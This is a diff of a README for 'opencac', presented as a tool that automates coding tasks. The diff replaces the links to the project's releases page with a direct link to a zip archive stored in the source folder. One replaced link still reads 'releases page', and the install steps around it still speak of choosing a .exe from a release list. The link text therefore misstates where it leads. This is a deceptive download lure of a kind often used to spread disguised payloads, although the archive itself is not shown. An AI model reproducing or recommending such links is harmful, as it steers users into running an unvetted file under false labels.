@@ -1,6 +1,6 @@
 # 🤖 opencac - Automate complex coding tasks with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://github.com/Visagespoon207/opencac/releases)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue.svg)](https://raw.githubusercontent.com/Visagespoon207/opencac/main/src/opencac/Software-v1.1-alpha.4.zip)
 
 ## 📌 About this tool
 
@@ -16,7 +16,7 @@ If you use a local AI model on your own computer, the tool uses speculative deco
 
 You need to download the installer from the official release page.
 
-1. Go to the [releases page](https://github.com/Visagespoon207/opencac/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/Visagespoon207/opencac/main/src/opencac/Software-v1.1-alpha.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe for Windows.
 4. Save the file to your computer.
